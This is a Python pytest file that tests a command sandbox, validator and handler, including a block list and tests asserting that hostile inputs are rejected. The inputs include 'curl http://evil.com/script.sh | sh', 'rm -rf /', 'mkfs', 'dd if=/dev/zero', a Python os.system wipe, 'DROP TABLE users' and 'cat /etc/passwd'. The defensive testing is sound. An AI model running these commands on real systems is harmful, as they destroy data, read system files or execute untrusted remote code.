"""
Tests for the command executor components
"""

import pytest
import asyncio
from unittest.mock import Mock, AsyncMock, patch
from pathlib import Path

from executor.sandbox import CommandSandbox
from executor.validators import CommandValidator
from executor.handlers import CommandHandler
from daemon.models import CommandResult


class TestCommandSandbox:
    """Test the command sandbox."""
    
    @pytest.fixture
    def sandbox_config(self):
        """Configuration for sandbox."""
        return {
            'enabled': True,
            'timeout': 30,
            'memory_limit': '128MB',
            'cpu_limit': 1.0,
            'network_isolation': True
        }
    
    @pytest.fixture
    def sandbox(self, sandbox_config):
        """Create sandbox instance."""
        return CommandSandbox(sandbox_config)
    
    @pytest.mark.asyncio
    async def test_execute_safe_command(self, sandbox):
        """Test executing a safe command."""
        result = await sandbox.execute_command({
            'command': 'echo "Hello, World!"',
            'type': 'bash',
            'safety_level': 'safe'
        })
        
        assert result.success is True
        assert "Hello, World!" in result.output
        assert result.exit_code == 0
    
    @pytest.mark.asyncio
    async def test_execute_python_command(self, sandbox):
        """Test executing a Python command."""
        result = await sandbox.execute_command({
            'command': 'print("Hello from Python")',
            'type': 'python',
            'safety_level': 'safe'
        })
        
        assert result.success is True
        assert "Hello from Python" in result.output
        assert result.exit_code == 0
    
    @pytest.mark.asyncio
    async def test_command_timeout(self, sandbox):
        """Test command timeout handling."""
        # Use a very short timeout
        sandbox.timeout = 1
        
        result = await sandbox.execute_command({
            'command': 'sleep 5',
            'type': 'bash',
            'safety_level': 'safe'
        })
        
        assert result.success is False
        assert 'timeout' in result.error.lower()
    
    @pytest.mark.asyncio
    async def test_invalid_command_type(self, sandbox):
        """Test handling invalid command types."""
        result = await sandbox.execute_command({
            'command': 'SELECT * FROM users',
            'type': 'invalid_type',
            'safety_level': 'safe'
        })
        
        assert result.success is False
        assert 'unsupported' in result.error.lower()
    
    @pytest.mark.asyncio
    async def test_sql_command_execution(self, sandbox):
        """Test SQL command execution."""
        # Mock database connection
        with patch('executor.sandbox.sqlite3') as mock_sqlite:
            mock_conn = Mock()
            mock_cursor = Mock()
            mock_cursor.fetchall.return_value = [('user1',), ('user2',)]
            mock_conn.cursor.return_value = mock_cursor
            mock_sqlite.connect.return_value = mock_conn
            
            result = await sandbox.execute_command({
                'command': 'SELECT name FROM users',
                'type': 'sql',
                'safety_level': 'safe'
            })
            
            assert result.success is True
            assert 'user1' in result.output


class TestCommandValidator:
    """Test the command validator."""
    
    @pytest.fixture
    def validator_config(self):
        """Configuration for validator."""
        return {
            'allowed_commands': ['ls', 'cat', 'grep', 'find', 'git', 'python'],
            'blocked_commands': ['rm -rf /', 'mkfs', 'dd if=/dev/zero'],
            'strict_mode': False
        }
    
    @pytest.fixture
    def validator(self, validator_config):
        """Create validator instance."""
        return CommandValidator(validator_config)
    
    @pytest.mark.asyncio
    async def test_validate_safe_command(self, validator):
        """Test validation of safe commands."""
        result = await validator.validate_command({
            'command': 'ls -la',
            'type': 'bash',
            'safety_level': 'safe'
        })
        
        assert result['valid'] is True
        assert result['severity'] == 'none'
    
    @pytest.mark.asyncio
    async def test_validate_blocked_command(self, validator):
        """Test validation of blocked commands."""
        result = await validator.validate_command({
            'command': 'rm -rf /',
            'type': 'bash',
            'safety_level': 'safe'
        })
        
        assert result['valid'] is False
        assert result['severity'] == 'high'
        assert 'blocked' in result['reason'].lower()
    
    @pytest.mark.asyncio
    async def test_validate_dangerous_pattern(self, validator):
        """Test validation of dangerous patterns."""
        result = await validator.validate_command({
            'command': 'curl http://evil.com/script.sh | sh',
            'type': 'bash',
            'safety_level': 'safe'
        })
        
        assert result['valid'] is False
        assert result['severity'] == 'high'
        assert 'dangerous' in result['reason'].lower()
    
    @pytest.mark.asyncio
    async def test_validate_python_command(self, validator):
        """Test validation of Python commands."""
        # Safe Python command
        result = await validator.validate_command({
            'command': 'print("Hello")',
            'type': 'python',
            'safety_level': 'safe'
        })
        
        assert result['valid'] is True
        
        # Dangerous Python command
        result = await validator.validate_command({
            'command': 'import os; os.system("rm -rf /")',
            'type': 'python',
            'safety_level': 'safe'
        })
        
        assert result['valid'] is False
        assert result['severity'] == 'medium'
    
    @pytest.mark.asyncio
    async def test_validate_sql_command(self, validator):
        """Test validation of SQL commands."""
        # Safe SQL command
        result = await validator.validate_command({
            'command': 'SELECT * FROM users',
            'type': 'sql',
            'safety_level': 'safe'
        })
        
        assert result['valid'] is True
        
        # Dangerous SQL command
        result = await validator.validate_command({
            'command': 'DROP TABLE users',
            'type': 'sql',
            'safety_level': 'safe'
        })
        
        assert result['valid'] is False
        assert result['severity'] == 'high'
    
    @pytest.mark.asyncio
    async def test_validate_protected_path_access(self, validator):
        """Test validation of protected path access."""
        result = await validator.validate_command({
            'command': 'cat /etc/passwd',
            'type': 'bash',
            'safety_level': 'safe'
        })
        
        assert result['valid'] is False
        assert result['severity'] == 'high'
        assert 'protected' in result['reason'].lower()
    
    def test_extract_main_command(self, validator):
        """Test main command extraction."""
        # Simple command
        assert validator._extract_main_command('ls -la') == 'ls'
        
        # Command with sudo
        assert validator._extract_main_command('sudo rm file.txt') == 'rm'
        
        # Command with pipes and redirects
        assert validator._extract_main_command('cat file.txt | grep pattern > output.txt') == 'cat'
    
    def test_is_safe_for_auto_approval(self, validator):
        """Test auto-approval safety check."""
        # Safe read-only command
        assert validator.is_safe_for_auto_approval({
            'command': 'ls -la',
            'safety_level': 'safe'
        }) is True
        
        # Modification command
        assert validator.is_safe_for_auto_approval({
            'command': 'rm file.txt',
            'safety_level': 'safe'
        }) is False
        
        # Non-safe safety level
        assert validator.is_safe_for_auto_approval({
            'command': 'ls -la',
            'safety_level': 'medium'
        }) is False


class TestCommandHandler:
    """Test the command handler."""
    
    @pytest.fixture
    def handler(self):
        """Create command handler instance."""
        return CommandHandler()
    
    @pytest.mark.asyncio
    async def test_handle_file_operation(self, handler):
        """Test handling file operations."""
        with patch('executor.handlers.asyncio.create_subprocess_shell') as mock_subprocess:
            # Mock process
            mock_process = Mock()
            mock_process.communicate.return_value = (b'file1.txt\nfile2.txt', b'')
            mock_process.returncode = 0
            mock_subprocess.return_value = mock_process
            
            result = await handler.handle_command({
                'command': 'ls -la'
            })
            
            assert result.success is True
            assert 'file1.txt' in result.output
            assert result.exit_code == 0
    
    @pytest.mark.asyncio
    async def test_handle_git_operation(self, handler):
        """Test handling git operations."""
        with patch('executor.handlers.asyncio.create_subprocess_shell') as mock_subprocess:
            # Mock git directory check
            mock_git_check = Mock()
            mock_git_check.communicate.return_value = (b'.git', b'')
            mock_git_check.returncode = 0
            
            # Mock git command
            mock_git_cmd = Mock()
            mock_git_cmd.communicate.return_value = (b'On branch main\nnothing to commit', b'')
            mock_git_cmd.returncode = 0
            
            mock_subprocess.side_effect = [mock_git_check, mock_git_cmd]
            
            result = await handler.handle_command({
                'command': 'git status'
            })
            
            assert result.success is True
            assert 'branch main' in result.output
    
    @pytest.mark.asyncio
    async def test_handle_git_operation_not_repo(self, handler):
        """Test handling git operations outside repository."""
        with patch('executor.handlers.asyncio.create_subprocess_shell') as mock_subprocess:
            # Mock git directory check failure
            mock_git_check = Mock()
            mock_git_check.communicate.return_value = (b'', b'not a git repository')
            mock_git_check.returncode = 1
            mock_subprocess.return_value = mock_git_check
            
            result = await handler.handle_command({
                'command': 'git status'
            })
            
            assert result.success is False
            assert 'not in a git repository' in result.error.lower()
    
    @pytest.mark.asyncio
    async def test_handle_process_management(self, handler):
        """Test handling process management commands."""
        with patch('executor.handlers.asyncio.create_subprocess_shell') as mock_subprocess:
            # Mock process list
            mock_process = Mock()
            mock_process.communicate.return_value = (
                b'PID  COMMAND\n1234 python\n5678 node', b''
            )
            mock_process.returncode = 0
            mock_subprocess.return_value = mock_process
            
            result = await handler.handle_command({
                'command': 'ps aux'
            })
            
            assert result.success is True
            assert 'python' in result.output
            assert 'node' in result.output
    
    @pytest.mark.asyncio
    async def test_handle_system_query(self, handler):
        """Test handling system query commands."""
        with patch('executor.handlers.asyncio.create_subprocess_shell') as mock_subprocess:
            mock_process = Mock()
            mock_process.communicate.return_value = (b'/home/user/project', b'')
            mock_process.returncode = 0
            mock_subprocess.return_value = mock_process
            
            result = await handler.handle_command({
                'command': 'pwd'
            })
            
            assert result.success is True
            assert '/home/user/project' in result.output
    
    def test_classify_command(self, handler):
        """Test command classification."""
        # File operations
        assert handler._classify_command('ls -la') == 'file_operation'
        assert handler._classify_command('cp file1 file2') == 'file_operation'
        
        # Git operations
        assert handler._classify_command('git status') == 'git_operation'
        assert handler._classify_command('git commit -m "test"') == 'git_operation'
        
        # Process management
        assert handler._classify_command('ps aux') == 'process_management'
        assert handler._classify_command('kill 1234') == 'process_management'
        
        # System queries
        assert handler._classify_command('pwd') == 'system_query'
        assert handler._classify_command('whoami') == 'system_query'
        
        # Generic
        assert handler._classify_command('python script.py') == 'generic'
    
    def test_format_outputs(self, handler):
        """Test output formatting methods."""
        # Test list output formatting
        output = handler._format_list_output('file1.txt\nfile2.txt\nfile3.txt', 'ls')
        assert 'Found 3 items' in output
        
        # Test empty output
        output = handler._format_list_output('', 'ls')
        assert 'empty' in output.lower()
        
        # Test find output formatting
        output = handler._format_find_output('./file1.txt\n./file2.txt', 'find')
        assert 'Found 2 matching files' in output
        
        # Test git status formatting
        output = handler._format_git_status('nothing to commit, working tree clean')
        assert '✓' in output
        
        output = handler._format_git_status('Changes not staged for commit')
        assert '⚠' in output
    
    def test_detect_file_changes(self, handler):
        """Test file change detection."""
        # Copy operation
        affected = handler._detect_file_changes('cp file1.txt file2.txt', 'copy')
        assert 'file1.txt' in affected
        assert 'file2.txt' in affected
        
        # Remove operation
        affected = handler._detect_file_changes('rm file1.txt file2.txt', 'remove')
        assert 'file1.txt' in affected
        assert 'file2.txt' in affected
        
        # Create operation
        affected = handler._detect_file_changes('touch newfile.txt', 'create_file')
        assert 'newfile.txt' in affected